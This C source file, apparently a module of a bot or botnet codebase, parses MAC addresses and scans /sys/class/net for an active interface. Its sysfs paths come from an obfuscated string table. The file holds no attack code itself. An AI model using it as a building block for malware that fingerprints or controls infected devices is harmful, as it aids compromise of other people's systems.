#include <dirent.h>
#include <fcntl.h>

#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/hexadecimal.h"
#include "bot/utils/network.h"
#include "bot/utils/string.h"
#include "bot/utils/tokenizer.h"

/* parses a mac address */
void network_parse_mac(pmac_parse_t mac_addr, char *address) {
  ptokenizer_t tokenizer = tokenizer_new(address, ":");

  if (!tokenizer || tokenizer->size != 6) {
    tokenizer_free(tokenizer);
    return;
  }

  unsigned char mac_bytes[6];
  for (int i = 0; i < 6; i++) {
    mac_bytes[i] = hex_to_byte(tokenizer->tokens[i][0], tokenizer->tokens[i][1]);
  }

  uint32_t high_val;
  uint16_t low_val;

  memcpy(&high_val, mac_bytes, sizeof(high_val));
  memcpy(&low_val, mac_bytes + 4, sizeof(low_val));

  mac_addr->high = htonl(high_val);
  mac_addr->low = htons(low_val);

  tokenizer_free(tokenizer);
}

/* retrieves the network mac address */
pmac_parse_t network_retrieve_mac(pmac_parse_t m) {
  DIR *dir;
  struct dirent *entry;
  char path[512];
  char address[32], flags[32], carrier;
  int fd, len;

  memset(m, 0, sizeof(mac_parse_t));

  dir = opendir(table_retrieve(TABLE_SYS_CLASS_NET, NULL));
  table_lock(TABLE_SYS_CLASS_NET);

  if (!dir) return m;

  while ((entry = readdir(dir)) != NULL) {
    const char *iface = entry->d_name;

    // skip the shit we don't need
    if (iface[0] == '.' || strcmp(iface, "lo") == 0) continue;

    strcpy(path, table_retrieve(TABLE_SYS_CLASS_NET, NULL));
    strcat(path, iface);
    strcat(path, table_retrieve(TABLE_ADDRESS, NULL));

    // open sys class net bullshit
    fd = open(path, O_RDONLY);
    if (fd < 0) continue;

    // read the mac address
    len = read(fd, address, sizeof(address) - 1);
    close(fd);
    if (len <= 0) continue;

    // strip new lines and shit
    len -= str_strip(address, len);
    address[len] = '\0';

    // parse address, copy interface to mac structure
    network_parse_mac(m, address);
    strncpy(m->interface, iface, sizeof(m->interface) - 1);

    // if high or low don't exist, continue and search new MAC
    if (!(m->high || m->low)) continue;

    strcpy(path, table_retrieve(TABLE_SYS_CLASS_NET, NULL));
    strcat(path, iface);
    strcat(path, table_retrieve(TABLE_FLAGS, NULL));

    // open flags
    fd = open(path, O_RDONLY);
    if (fd < 0) continue;

    // read the flags
    len = read(fd, flags, sizeof(flags) - 1);
    close(fd);
    if (len <= 0) continue;

    // strip out the new lines
    len -= str_strip(flags, len);
    flags[len] = '\0';

    // convert to pointer, strip 0x start out of flgs
    char *flags_ptr = flags;
    if (flags[0] == '0' && (flags[1] == 'x' || flags[1] == 'X')) {
      len -= 2;
      flags_ptr += 2;
    }

    // validate length, if invalid search new interface
    if (len != 4) {
      continue;
    }

    // convert to flags and check if not up or reject
    uint16_t iface_flags = hex_convert_u16(flags_ptr[0], flags_ptr[1], flags_ptr[2], flags_ptr[3]);
    if ((iface_flags & 1) == 0 || (iface_flags & 0x200) != 0) {
      LOG_WARN("Interface ['%s'] is not up or reject, skipping", iface);
      continue;
    }

    // lastly, validate the carrier
    strcpy(path, table_retrieve(TABLE_SYS_CLASS_NET, NULL));
    strcat(path, iface);
    strcat(path, table_retrieve(TABLE_CARRIER, NULL));

    fd = open(path, O_RDONLY);
    if (fd < 0) continue;

    len = read(fd, &carrier, 1);
    close(fd);

    if (len != 1 || carrier != '1') {
      LOG_WARN("Interface ['%s'] is not a carrier, skipping", iface);
      continue;
    }

    LOG_INFO("Found interface ['%s'] with MAC address ['%s']", iface, address);
    break;
  }

  closedir(dir);
  table_lock(TABLE_SYS_CLASS_NET);

  return m;
}
